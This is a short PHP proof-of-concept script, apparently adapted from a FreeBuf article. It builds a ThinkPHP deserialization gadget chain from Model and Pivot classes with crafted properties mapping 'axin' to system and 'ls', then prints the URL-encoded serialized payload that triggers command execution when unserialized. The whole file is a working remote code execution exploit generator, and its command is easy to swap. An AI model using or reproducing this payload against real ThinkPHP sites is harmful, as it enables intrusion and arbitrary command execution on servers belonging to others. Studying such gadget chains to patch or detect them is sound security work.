<?php
//https://www.freebuf.com/articles/web/221939.html
namespace think\model\concern;
trait Conversion
{
}

trait Attribute
{
    private $data;
    private $withAttr = ["axin" => "system"]; //函数

    public function get()
    {
        $this->data = ["axin" => "ls"];  //参数
    }
}

namespace think;
abstract class Model{
    use model\concern\Attribute;
    use model\concern\Conversion;
    private $lazySave = false;
    protected $withEvent = false;
    private $exists = true;
    private $force = true;
    protected $field = [];
    protected $schema = [];
    protected $connection='mysql';
    protected $name;
    protected $suffix = '';
    function __construct(){
        $this->get();
        $this->lazySave = true;
        $this->withEvent = false;
        $this->exists = true;
        $this->force = true;
        $this->field = [];
        $this->schema = [];
        $this->connection = 'mysql';
    }

}

namespace think\model;

use think\Model;

class Pivot extends Model
{
    function __construct($obj='')
    {
        parent::__construct();
        $this->name = $obj;
    }
}
$a = new Pivot();
$b = new Pivot($a);

echo urlencode(serialize($b));